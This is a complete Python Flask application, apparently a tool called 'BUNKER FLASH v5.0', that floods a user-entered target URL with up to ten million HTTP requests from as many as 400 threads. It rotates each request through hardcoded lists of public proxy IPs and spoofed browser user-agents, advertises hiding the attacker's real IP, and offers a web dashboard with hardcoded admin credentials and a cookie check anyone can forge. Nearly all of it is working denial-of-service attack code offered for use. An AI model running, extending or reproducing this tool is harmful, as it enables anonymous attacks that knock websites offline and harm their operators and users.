from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
attack_counters = {}

# ⚡ PROXY POOLS
SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080","192.111.137.35:4145","38.170.157.77:1080",
    "103.152.232.34:1080","45.127.248.127:1080","139.99.237.62:1080",
]

SOCKS4_PROXIES = [
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145",
    "88.204.142.108:1080","192.252.220.92:4145","173.234.232.61:4145",
    "184.178.172.5:4145","72.221.164.35:4145","98.162.25.29:4145",
]

HTTP_PROXIES = [
    "51.89.14.70:80","51.79.50.149:80","50.174.7.154:80",
    "20.210.113.32:80","20.24.43.214:80","43.153.195.200:80",
]

custom_proxies = []

# ============================================
# 🎭 30+ BROWSER FINGERPRINTS
# ============================================
BROWSER_PROFILES = [
    # Chrome Windows
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "Windows 10", "browser": "Chrome 120"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "os": "Windows 10", "browser": "Chrome 119"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36", "os": "Windows 10", "browser": "Chrome 118"},
    # Chrome Mac
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "macOS 10.15", "browser": "Chrome 120"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "os": "macOS 10.15", "browser": "Chrome 119"},
    # Chrome Linux
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "Linux x64", "browser": "Chrome 120"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "os": "Linux x64", "browser": "Chrome 119"},
    # Firefox Windows
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0", "os": "Windows 10", "browser": "Firefox 121"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0", "os": "Windows 10", "browser": "Firefox 120"},
    # Firefox Mac
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0", "os": "macOS 10.15", "browser": "Firefox 121"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0", "os": "macOS 10.15", "browser": "Firefox 120"},
    # Firefox Linux
    {"ua": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "os": "Linux x64", "browser": "Firefox 121"},
    # Safari macOS
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15", "os": "macOS 10.15", "browser": "Safari 17"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15", "os": "macOS 10.15", "browser": "Safari 16"},
    # Safari iOS
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", "os": "iOS 17", "browser": "Safari Mobile"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1", "os": "iOS 16", "browser": "Safari Mobile"},
    {"ua": "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", "os": "iOS 17", "browser": "Safari iPad"},
    # Chrome Android
    {"ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android 14", "browser": "Chrome Mobile"},
    {"ua": "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android 13", "browser": "Chrome Mobile"},
    {"ua": "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36", "os": "Android 14", "browser": "Chrome Mobile"},
    # Firefox Android
    {"ua": "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0", "os": "Android 14", "browser": "Firefox Mobile"},
    # Edge Windows
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", "os": "Windows 10", "browser": "Edge 120"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", "os": "Windows 10", "browser": "Edge 119"},
    # Edge Mac
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", "os": "macOS 10.15", "browser": "Edge 120"},
    # Opera Windows
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0", "os": "Windows 10", "browser": "Opera 106"},
    # Brave Windows
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "Windows 10", "browser": "Brave 120"},
    # Vivaldi Windows
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "Windows 10", "browser": "Vivaldi 6.5"},
    # Samsung Internet
    {"ua": "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android 14", "browser": "Samsung Browser"},
    # UC Browser
    {"ua": "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 UCBrowser/13.7.0.1300", "os": "Android 13", "browser": "UC Browser"},
    # Chrome Windows 11
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36", "os": "Windows 11", "browser": "Chrome 121"},
]

# ============================================
# ⚡ FLASH REQUEST - ULTRA FAST
# ============================================
def flash_request(url, proxy_info=None):
    """FLASH SPEED request with random browser"""
    try:
        profile = random.choice(BROWSER_PROFILES)
        
        headers = {
            "User-Agent": profile["ua"],
            "Accept": "*/*",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",  # close = faster
        }
        
        if proxy_info:
            ptype, paddr = proxy_info
            host, port_str = paddr.split(":")
            port = int(port_str)
            
            session = requests.Session()
            
            if ptype == "socks5":
                session.proxies = {"http": f"socks5h://{host}:{port}", "https": f"socks5h://{host}:{port}"}
            elif ptype == "socks4":
                session.proxies = {"http": f"socks4://{host}:{port}", "https": f"socks4://{host}:{port}"}
            else:
                session.proxies = {"http": f"http://{host}:{port}", "https": f"http://{host}:{port}"}
            
            response = session.get(url, headers=headers, timeout=10, verify=False)
        else:
            session = requests.Session()
            response = session.get(url, headers=headers, timeout=10, verify=False)
        
        return response.status_code < 500
    except:
        return False

# ============================================
# ⚡ FLASH WORKER - MAXIMUM SPEED
# ============================================
def flash_worker(attack_id, url, count, speed, mode):
    """FLASH worker - minimum delay for maximum speed"""
    delays = {"slow": 0.01, "fast": 0.001, "ultra": 0.0001, "flash": 0}
    delay = delays.get(speed, 0.001)
    
    # Build proxy pool
    all_proxies = []
    for p in SOCKS5_PROXIES: all_proxies.append(("socks5", p))
    for p in SOCKS4_PROXIES: all_proxies.append(("socks4", p))
    for p in HTTP_PROXIES: all_proxies.append(("http", p))
    for cp in custom_proxies:
        cp = cp.strip()
        if cp.startswith("socks5://"): all_proxies.append(("socks5", cp[9:]))
        elif cp.startswith("socks4://"): all_proxies.append(("socks4", cp[9:]))
        elif cp.startswith("http://"): all_proxies.append(("http", cp[7:]))
        elif ":" in cp: all_proxies.append(("socks5", cp))
    
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        # Random proxy every request
        proxy_info = random.choice(all_proxies) if all_proxies else None
        
        if flash_request(url, proxy_info):
            success += 1
            attack_stats["success"] += 1
        else:
            fail += 1
            attack_stats["failed"] += 1
        
        attack_stats["total"] += 1
        
        if attack_id in attack_counters:
            proxy_display = proxy_info[1][:18] if proxy_info else "DIRECT"
            attack_counters[attack_id] = {
                "done": i+1, "total": count,
                "success": success, "fail": fail,
                "proxy": proxy_display
            }
        
        if i % 200 == 0 and i > 0:
            proxy_display = proxy_info[1][:18] if proxy_info else "DIRECT"
            attack_logs.append(f"⚡ [{i}/{count}] ✅{success} ❌{fail} | {proxy_display}")
        
        # FLASH: almost no delay
        if delay > 0 and i % 50 == 0:
            time.sleep(delay)

# ============================================
# 🚀 FLASH LAUNCH
# ============================================
def run_flash_attack(attack_id, url, count, speed, mode):
    """FLASH attack - maximum workers"""
    workers_map = {"slow": 30, "fast": 80, "ultra": 200, "flash": 400}
    workers = workers_map.get(speed, 80)
    req_per_worker = max(1, count // workers)
    
    total_proxies = len(SOCKS5_PROXIES) + len(SOCKS4_PROXIES) + len(HTTP_PROXIES) + len(custom_proxies)
    
    attack_logs.append(f"⚡ FLASH MODE: {url[:40]}...")
    attack_logs.append(f"🔥 {count} REQ | {speed.upper()} | {workers} Workers")
    attack_logs.append(f"🔒 {total_proxies} Proxies | 30 Browser Fingerprints")
    attack_logs.append(f"🎭 Multi-Session: EACH request = Different Browser + IP")
    
    attack_counters[attack_id] = {"done": 0, "total": count, "success": 0, "fail": 0, "proxy": "RANDOM"}
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(flash_worker, attack_id, url, req_per_worker, speed, mode) for _ in range(workers)]
        for future in as_completed(futures):
            try: future.result(timeout=600)
            except: pass
    
    if attack_id in active_attacks: del active_attacks[attack_id]
    if attack_id in attack_counters: del attack_counters[attack_id]
    
    attack_logs.append(f"🏁 FLASH DONE: ✅{attack_stats['success']} ❌{attack_stats['failed']}")

# ============================================
# 🎨 BEAUTIFUL UI - BIG BUTTONS
# ============================================
LOGIN = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>⚡ BUNKER FLASH v5.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,rgba(255,0,0,0.03) 25%,transparent 25%,transparent 75%,rgba(255,0,0,0.03) 75%),linear-gradient(-45deg,rgba(0,255,136,0.02) 25%,transparent 25%,transparent 75%,rgba(0,255,136,0.02) 75%);background-size:60px 60px;animation:bgMove 15s linear infinite}
@keyframes bgMove{0%{background-position:0 0}100%{background-position:60px 60px}}
.box{background:rgba(10,0,0,0.95);padding:50px;border-radius:24px;border:2px solid rgba(255,0,0,0.5);width:420px;text-align:center;z-index:1;box-shadow:0 0 100px rgba(255,0,0,0.3),0 0 200px rgba(0,255,136,0.05);position:relative}
.box::before{content:'';position:absolute;top:-3px;left:-3px;right:-3px;bottom:-3px;border-radius:27px;background:linear-gradient(45deg,#ff0000,#00ff44,#ff0000,#ffd700);z-index:-1;animation:borderRotate 3s linear infinite;opacity:0.6;filter:blur(12px)}
@keyframes borderRotate{0%{filter:blur(12px) hue-rotate(0deg)}100%{filter:blur(12px) hue-rotate(360deg)}}
.logo{font-size:4em;animation:bounce 1s infinite}@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
h1{font-size:2.2em;font-weight:900;background:linear-gradient(180deg,#ff0000,#ffd700,#00ff44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px}
.tag{color:#ff4444;font-size:0.75em;letter-spacing:6px;margin:12px 0}
input{width:100%;padding:16px;background:rgba(0,0,0,0.8);border:1px solid rgba(255,0,0,0.4);border-radius:12px;color:#ff4444;margin:10px 0;font-size:15px;font-family:monospace;transition:0.3s}
input:focus{border-color:#00ff44;box-shadow:0 0 25px rgba(0,255,68,0.3);outline:none}
.btn{width:100%;padding:18px;background:linear-gradient(135deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:12px;font-weight:700;cursor:pointer;font-size:16px;margin-top:15px;letter-spacing:3px;text-transform:uppercase;transition:0.3s}
.btn:hover{background:linear-gradient(135deg,#ff4444,#ff0000);box-shadow:0 0 50px rgba(255,0,0,0.7);transform:translateY(-3px)}.btn:active{transform:scale(0.95)}
.features{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-top:15px}
.feat{padding:5px 12px;background:rgba(0,255,68,0.05);border:1px solid rgba(0,255,68,0.2);border-radius:16px;color:#00ff44;font-size:0.5em;letter-spacing:1px}
</style></head><body>
<div class="box">
<div class="logo">⚡</div>
<h1>BUNKER FLASH</h1>
<div class="tag">v5.0 • ULTRA SPEED</div>
<p style="color:#888;font-size:0.6em;letter-spacing:1px">400 WORKERS • 30 BROWSERS • FLASH SPEED</p>
<div class="features">
<span class="feat">⚡ FLASH</span><span class="feat">🎭 30 BROWSERS</span><span class="feat">🔒 PROXY</span><span class="feat">💀 HIDDEN</span>
</div>
<form method="post">
<input type="text" name="user" placeholder="🔑 USERNAME" autocomplete="off">
<input type="password" name="pass" placeholder="🔐 PASSWORD">
<button class="btn" type="submit">☠️ LAUNCH SYSTEM</button>
</form>
{% if error %}<p style="color:#ff0000;margin-top:10px;font-size:0.8em">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>⚡ BUNKER FLASH v5.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:12px}
.container{max-width:1300px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 25px;border:2px solid rgba(255,0,0,0.5);border-radius:16px;margin-bottom:18px;background:rgba(10,0,0,0.95);flex-wrap:wrap;gap:12px;box-shadow:0 0 40px rgba(255,0,0,0.2)}
.header h1{font-size:1.8em;font-weight:900;background:linear-gradient(180deg,#ff0000,#ffd700,#00ff44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:18px}
.stat{background:rgba(10,0,0,0.95);border:1px solid rgba(255,0,0,0.3);border-radius:14px;padding:20px;text-align:center;transition:0.3s}
.stat:hover{border-color:#00ff44;box-shadow:0 0 25px rgba(0,255,68,0.2)}
.stat-val{font-size:2.5em;font-weight:900}.s{color:#00ff44}.f{color:#ff0000}.t{color:#ffd700}
.stat-label{font-size:0.6em;color:#888;text-transform:uppercase;letter-spacing:3px;margin-top:5px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:18px}
.card{background:rgba(10,0,0,0.95);border:1px solid rgba(255,0,0,0.3);border-radius:14px;padding:22px;transition:0.3s}
.card:hover{border-color:rgba(0,255,68,0.3);box-shadow:0 0 30px rgba(0,255,68,0.05)}
.card h3{color:#ffd700;margin-bottom:14px;font-size:0.9em;letter-spacing:2px;text-transform:uppercase}
input,select,textarea{width:100%;padding:14px;background:#000;border:1px solid rgba(255,0,0,0.4);border-radius:10px;color:#ff4444;margin:5px 0;font-size:13px;font-family:monospace;transition:0.3s}
input:focus,select:focus,textarea:focus{border-color:#00ff44;box-shadow:0 0 20px rgba(0,255,68,0.2);outline:none}
label{font-size:0.6em;color:#888;text-transform:uppercase;letter-spacing:2px;display:block;margin-top:8px}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;margin:5px 0;font-size:0.8em;text-transform:uppercase;letter-spacing:2px;transition:0.3s}
.btn:hover{background:linear-gradient(135deg,#ff4444,#ff0000);box-shadow:0 0 35px rgba(255,0,0,0.5);transform:translateY(-2px)}.btn:active{transform:scale(0.96)}
.btn-flash{background:linear-gradient(135deg,#ffd700,#ff8800);color:#000;font-size:0.9em;padding:18px}.btn-flash:hover{box-shadow:0 0 45px rgba(255,215,0,0.6)}
.btn-stop{background:#222;color:#ff0000;border:1px solid #ff0000;font-size:0.9em;padding:18px}
.btn-green{background:linear-gradient(135deg,#00aa00,#00ff44);color:#000}.btn-green:hover{box-shadow:0 0 30px rgba(0,255,68,0.5)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.logs{background:#000;border:1px solid rgba(255,0,0,0.2);border-radius:10px;padding:14px;max-height:280px;overflow:auto;font-size:0.65em;font-family:monospace;color:#00ff44}
.log-e{padding:3px 0;border-bottom:1px solid #111;color:#aaa}
.counter{font-size:1.4em;color:#ffd700;text-align:center;padding:12px;font-family:monospace;background:rgba(10,0,0,0.8);border-radius:10px;margin-top:10px;font-weight:bold}
.badge{display:inline-block;padding:5px 14px;border-radius:16px;font-size:0.55em;font-weight:700}
.badge-flash{background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3);animation:flashPulse 0.5s infinite}
@keyframes flashPulse{50%{box-shadow:0 0 25px rgba(255,215,0,0.4)}}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>⚡ BUNKER FLASH v5.0</h1><div style="color:#888;font-size:0.6em;letter-spacing:2px">400 WORKERS • 30 BROWSERS • FLASH SPEED • RANDOM IP</div></div>
<div style="display:flex;gap:10px;align-items:center">
<span class="badge badge-flash">⚡ FLASH MODE</span>
<a href="/logout" style="color:#ff0000;text-decoration:none;font-size:0.7em;font-weight:700">EXIT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 FLASH ATTACK</h3>
<label>🎯 TARGET URL</label><input type="text" id="url" placeholder="https://target.com">
<div class="row"><div><label>📊 REQUESTS</label><input type="number" id="count" value="50000"></div><div>
<label>⚡ SPEED</label><select id="speed"><option value="slow">🐢 Slow (30w)</option><option value="fast">⚡ Fast (80w)</option><option value="ultra">💀 ULTRA (200w)</option><option value="flash" selected>⚡ FLASH (400w)</option></select>
</div></div>
<label>🛡️ PROXY MODE</label><select id="mode"><option value="socks5">SOCKS5</option><option value="socks4">SOCKS4</option><option value="http">HTTP</option><option value="mixed">Mixed</option><option value="all" selected>ALL PROXIES</option></select>
<label>🔧 CUSTOM PROXIES</label><textarea id="customProxies" rows="2" placeholder="socks5://ip:port&#10;http://ip:port"></textarea>
<button class="btn btn-flash" onclick="start()">⚡ LAUNCH FLASH ATTACK</button>
<button class="btn btn-stop" onclick="stop()">⏹️ TERMINATE</button>
<div class="counter" id="liveCounter">⚡ READY FOR FLASH</div>
</div>

<div class="card">
<h3>📊 LIVE STATS</h3>
<div class="row"><div class="stat"><div class="stat-val t" style="font-size:1.5em" id="successRate">0%</div><div class="stat-label">SUCCESS RATE</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.5em" id="rps">0</div><div class="stat-label">REQ/SEC</div></div></div>
<div style="margin-top:12px;color:#0f0;font-size:0.65em;text-align:center;line-height:2">
⚡ <span style="color:#ffd700">FLASH SPEED: 400 WORKERS</span><br>
🎭 <span style="color:#ff4444">30 BROWSER FINGERPRINTS</span><br>
🔒 <span style="color:#00ff44">RANDOM PROXY PER REQUEST</span><br>
💀 <span style="color:#ffd700">REAL IP: 100% HIDDEN</span>
</div>
</div>
</div>

<div class="card"><h3>📜 FLASH LOGS</h3><div class="logs" id="logs"><div class="log-e">⚡ BUNKER FLASH v5.0 READY</div><div class="log-e">🔥 400 Workers • 30 Browsers • Flash Speed</div><div class="log-e">🎭 Multi-Session: Different Browser + IP per request</div><div class="log-e">💀 AWAITING COMMAND...</div></div></div>
</div>

<script>
var lt=0,ltm=Date.now(),ci=null;
function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total;
var t=d.success+d.failed;document.getElementById('successRate').textContent=t>0?((d.success/t)*100).toFixed(1)+'%':'0%';
var n=Date.now(),dt=n-ltm;if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lt)/(dt/1000));lt=d.total;ltm=n;}
})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}
function c(){fetch('/counter').then(r=>r.json()).then(d=>{if(d.active){document.getElementById('liveCounter').textContent='⚡ '+d.done+'/'+d.total+' [✅'+d.success+' ❌'+d.fail+'] | '+d.proxy}else{document.getElementById('liveCounter').textContent='⚡ READY'}})}
function start(){
var url=document.getElementById('url').value,count=document.getElementById('count').value;
var speed=document.getElementById('speed').value,mode=document.getElementById('mode').value;
var proxies=document.getElementById('customProxies').value;
if(!url){alert('🎯 Enter Target URL!');return}
fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:proxies})});
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed,mode})}).then(r=>r.json()).then(d=>{
l();u();if(ci)clearInterval(ci);ci=setInterval(c,150)})}
function stop(){fetch('/stop',{method:'POST'}).then(()=>{if(ci){clearInterval(ci);ci=null}document.getElementById('liveCounter').textContent='⏹️ TERMINATED';l()})}
setInterval(function(){l();u()},800)
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="⛔ ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip()]
    return jsonify({"status":"ok"})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(d.get('count',100),10000000)
    speed = d.get('speed','flash')
    mode = d.get('mode','all')
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = f"flash_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_flash_attack, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started","speed":speed,"workers":400})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/counter')
def counter():
    for aid in active_attacks:
        if aid in attack_counters:
            return jsonify({"active":True,**attack_counters[aid]})
    return jsonify({"active":False})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("⚡ BUNKER FLASH v5.0 - ULTRA SPEED")
    print(f"🔥 Workers: 400 (FLASH)")
    print(f"🎭 Browsers: {len(BROWSER_PROFILES)}")
    print(f"🔒 Proxies: {len(SOCKS5_PROXIES)+len(SOCKS4_PROXIES)+len(HTTP_PROXIES)}")
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
